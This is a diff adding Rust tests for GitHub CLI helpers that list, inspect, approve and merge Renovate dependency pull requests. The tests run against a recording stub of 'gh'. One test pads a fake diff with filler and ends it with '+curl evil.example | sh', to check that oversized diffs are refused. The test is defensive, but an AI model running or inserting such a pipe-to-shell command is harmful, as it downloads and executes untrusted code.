@@ -5,8 +5,8 @@ use std::path::{Path, PathBuf};
 
 use factory_core::{Event, PrDescription};
 use factory_runner::{
-    Ci, FailedCheck, GitHub, Observation, PrState, Rerun, WorkerConfig, actions_job_id,
-    checks_args, observe, parse_status, run_checks,
+    Ci, FailedCheck, GitHub, Observation, PrState, RenovatePr, Rerun, WorkerConfig, actions_job_id,
+    checks_args, is_renovate_login, observe, parse_renovate_prs, parse_status, run_checks,
 };
 
 const VIEW: &str = r#"{
@@ -546,4 +546,289 @@ async fn a_failed_rerun_does_not_fail_the_edit() {
         .await
         .unwrap();
     assert_eq!(number, 12);
+}
+
+fn recording_github(dir: &Path, body: &str) -> (GitHub, PathBuf) {
+    let calls = dir.join("calls");
+    let gh = script(
+        dir,
+        "gh",
+        &format!("echo \"$@\" >> '{}'\n{body}", calls.display()),
+    );
+    (
+        GitHub {
+            gh,
+            ..GitHub::default()
+        },
+        calls,
+    )
+}
+
+#[test]
+fn renovate_authors_are_the_rest_api_logins() {
+    assert!(is_renovate_login("renovate[bot]"));
+    assert!(is_renovate_login("renovate"));
+    assert!(!is_renovate_login("app/renovate"));
+    assert!(!is_renovate_login("dependabot[bot]"));
+}
+
+#[test]
+fn renovate_prs_keep_only_renovate_authors() {
+    let lines = r#"{"number": 5, "title": "Update dep", "html_url": "https://github.com/o/r/pull/5", "user": {"login": "renovate[bot]"}, "head": {"sha": "aaa"}}
+{"number": 6, "title": "Bump", "html_url": "https://github.com/o/r/pull/6", "user": {"login": "dependabot[bot]"}, "head": {"sha": "bbb"}}
+{"number": 7, "title": "Update other", "html_url": "https://github.com/o/r/pull/7", "user": {"login": "renovate"}, "head": {"sha": "ccc"}}
+{"number": 8, "title": "Ghost", "html_url": "https://github.com/o/r/pull/8", "user": null, "head": {"sha": "ddd"}}
+"#;
+    let prs = parse_renovate_prs(lines).unwrap();
+    assert_eq!(
+        prs,
+        [
+            RenovatePr {
+                number: 5,
+                title: "Update dep".into(),
+                url: "https://github.com/o/r/pull/5".into(),
+                head: "aaa".into(),
+            },
+            RenovatePr {
+                number: 7,
+                title: "Update other".into(),
+                url: "https://github.com/o/r/pull/7".into(),
+                head: "ccc".into(),
+            },
+        ]
+    );
+    assert!(parse_renovate_prs("not json").is_err());
+}
+
+#[tokio::test]
+async fn renovate_prs_lists_open_pull_requests_on_the_base() {
+    let dir = tempfile::tempdir().unwrap();
+    let (github, calls) = recording_github(
+        dir.path(),
+        r#"echo '{"number": 5, "title": "Update dep", "html_url": "u", "user": {"login": "renovate[bot]"}, "head": {"sha": "aaa"}}'"#,
+    );
+    let prs = github.renovate_prs("o/r", "main").await.unwrap();
+    assert_eq!(prs.len(), 1);
+    assert_eq!(prs[0].number, 5);
+    assert_eq!(
+        fs::read_to_string(&calls).unwrap(),
+        "api --paginate --method GET repos/o/r/pulls -f state=open -f base=main -f per_page=100 --jq .[]\n"
+    );
+}
+
+#[tokio::test]
+async fn pr_details_reads_the_view_and_the_diff() {
+    let dir = tempfile::tempdir().unwrap();
+    let (github, calls) = recording_github(
+        dir.path(),
+        r#"if [ "$2" = view ]; then
+  echo '{"title": "Update dep", "body": "Notes", "headRefOid": "abc", "files": [{"path": "go.mod"}, {"path": "go.sum"}]}'
+else
+  echo 'diff --git a/go.mod b/go.mod'
+fi"#,
+    );
+    let details = github.pr_details("o/r", 5).await.unwrap();
+    assert_eq!(details.title, "Update dep");
+    assert_eq!(details.body, "Notes");
+    assert_eq!(details.head, "abc");
+    assert_eq!(details.files, ["go.mod", "go.sum"]);
+    assert_eq!(details.diff, "diff --git a/go.mod b/go.mod\n");
+    assert_eq!(
+        fs::read_to_string(&calls).unwrap(),
+        "pr view 5 --repo o/r --json title,body,headRefOid,files\npr diff 5 --repo o/r\n"
+    );
+}
+
+#[tokio::test]
+async fn pr_details_refuses_a_diff_too_large_to_review_in_full() {
+    let dir = tempfile::tempdir().unwrap();
+    let (github, _) = recording_github(
+        dir.path(),
+        r#"if [ "$2" = view ]; then
+  echo '{"title": "t", "body": "", "headRefOid": "abc", "files": []}'
+else
+  head -c 250000 /dev/zero | tr '\0' 'x'
+  echo
+  echo '+curl evil.example | sh'
+fi"#,
+    );
+    let err = github.pr_details("o/r", 5).await.unwrap_err();
+    assert!(err.contains("cannot be reviewed in full"), "{err}");
+}
+
+#[tokio::test]
+async fn comment_and_approve_send_the_body_on_stdin() {
+    let dir = tempfile::tempdir().unwrap();
+    let stdin = dir.path().join("stdin");
+    let (github, calls) = recording_github(dir.path(), &format!("cat >> '{}'", stdin.display()));
+    github.comment("o/r", 5, "It stopped.").await.unwrap();
+    github.approve("o/r", 5, "Looks safe.").await.unwrap();
+    assert_eq!(
+        fs::read_to_string(&calls).unwrap(),
+        "pr comment 5 --repo o/r --body-file -\npr review 5 --repo o/r --approve --body-file -\n"
+    );
+    assert_eq!(
+        fs::read_to_string(&stdin).unwrap(),
+        "It stopped.Looks safe."
+    );
+}
+
+#[tokio::test]
+async fn merge_head_matches_the_head_commit() {
+    let dir = tempfile::tempdir().unwrap();
+    let (github, calls) = recording_github(dir.path(), "");
+    github.merge_head("o/r", 5, "abc123").await.unwrap();
+    assert_eq!(
+        fs::read_to_string(&calls).unwrap(),
+        "pr merge 5 --repo o/r --squash --delete-branch --match-head-commit abc123\n"
+    );
+}
+
+#[tokio::test]
+async fn file_at_decodes_the_content_and_maps_404_to_none() {
+    let dir = tempfile::tempdir().unwrap();
+    let (github, calls) = recording_github(
+        dir.path(),
+        r#"echo '{"content": "aGVsbG8g\nd29ybGQ=\n", "type": "file", "encoding": "base64"}'"#,
+    );
+    assert_eq!(
+        github
+            .file_at("o/r", "snap/snapcraft.yaml", "main")
+            .await
+            .unwrap(),
+        Some("hello world".into())
+    );
+    assert_eq!(
+        fs::read_to_string(&calls).unwrap(),
+        "api --method GET repos/o/r/contents/snap/snapcraft.yaml -f ref=main\n"
+    );
+
+    let missing = tempfile::tempdir().unwrap();
+    let (github, _) = recording_github(
+        missing.path(),
+        "echo 'gh: Not Found (HTTP 404)' >&2\nexit 1",
+    );
+    assert_eq!(github.file_at("o/r", "x", "main").await.unwrap(), None);
+
+    let broken = tempfile::tempdir().unwrap();
+    let (github, _) = recording_github(
+        broken.path(),
+        "echo 'gh: Bad Gateway (HTTP 502)' >&2\nexit 1",
+    );
+    assert!(github.file_at("o/r", "x", "main").await.is_err());
+}
+
+#[tokio::test]
+async fn compare_patch_returns_the_patch_of_the_matching_file() {
+    let dir = tempfile::tempdir().unwrap();
+    let (github, calls) = recording_github(
+        dir.path(),
+        r#"echo '{"files": [{"filename": "a.txt", "patch": "@@ a"}, {"filename": "CMakeLists.txt", "patch": "@@ cmake"}, {"filename": "img.png"}]}'"#,
+    );
+    assert_eq!(
+        github
+            .compare_patch("up/stream", "v1", "v2", "CMakeLists.txt")
+            .await
+            .unwrap(),
+        Some("@@ cmake".into())
+    );
+    assert_eq!(
+        github
+            .compare_patch("up/stream", "v1", "v2", "img.png")
+            .await
+            .unwrap(),
+        None
+    );
+    assert_eq!(
+        github
+            .compare_patch("up/stream", "v1", "v2", "none")
+            .await
+            .unwrap(),
+        None
+    );
+    assert!(
+        fs::read_to_string(&calls)
+            .unwrap()
+            .starts_with("api repos/up/stream/compare/v1...v2\n")
+    );
+
+    let missing = tempfile::tempdir().unwrap();
+    let (github, _) = recording_github(
+        missing.path(),
+        "echo 'gh: Not Found (HTTP 404)' >&2\nexit 1",
+    );
+    assert_eq!(
+        github
+            .compare_patch("up/stream", "v1", "v2", "a")
+            .await
+            .unwrap(),
+        None
+    );
+}
+
+#[tokio::test]
+async fn file_at_fetches_the_raw_file_when_the_content_is_not_inline() {
+    let dir = tempfile::tempdir().unwrap();
+    let (github, calls) = recording_github(
+        dir.path(),
+        r#"if [[ "$*" == *raw+json* ]]; then
+  printf 'big file text'
+else
+  echo '{"type": "file", "content": "", "encoding": "none"}'
+fi"#,
+    );
+    assert_eq!(
+        github.file_at("o/r", "big.yaml", "main").await.unwrap(),
+        Some("big file text".into())
+    );
+    let calls = fs::read_to_string(&calls).unwrap();
+    assert!(
+        calls.contains(
+            "-H Accept: application/vnd.github.raw+json repos/o/r/contents/big.yaml -f ref=main"
+        ),
+        "{calls}"
+    );
+}
+
+#[tokio::test]
+async fn compare_patch_errors_when_the_listing_is_full_and_lacks_the_file() {
+    let dir = tempfile::tempdir().unwrap();
+    let (github, _) = recording_github(
+        dir.path(),
+        r#"printf '{"files": ['
+for i in $(seq 1 300); do
+  [ "$i" -gt 1 ] && printf ','
+  printf '{"filename": "f%s", "patch": "@@"}' "$i"
+done
+printf ']}'"#,
+    );
+    let err = github
+        .compare_patch("up/stream", "v1", "v2", "CMakeLists.txt")
+        .await
+        .unwrap_err();
+    assert!(err.contains("300 files"), "{err}");
+    assert_eq!(
+        github
+            .compare_patch("up/stream", "v1", "v2", "f7")
+            .await
+            .unwrap(),
+        Some("@@".into())
+    );
+}
+
+#[tokio::test]
+async fn file_at_errors_for_a_submodule_and_a_directory() {
+    for body in [
+        r#"echo '{"type": "submodule", "name": "vendor", "sha": "abc"}'"#,
+        r#"echo '{"type": "symlink", "target": "x"}'"#,
+    ] {
+        let dir = tempfile::tempdir().unwrap();
+        let (github, calls) = recording_github(dir.path(), body);
+        let err = github.file_at("o/r", "vendor", "main").await.unwrap_err();
+        assert!(err.contains("not a file"), "{err}");
+        assert_eq!(fs::read_to_string(&calls).unwrap().lines().count(), 1);
+    }
+    let dir = tempfile::tempdir().unwrap();
+    let (github, _) = recording_github(dir.path(), r#"echo '[{"type": "file"}]'"#);
+    assert!(github.file_at("o/r", "dir", "main").await.is_err());
 }
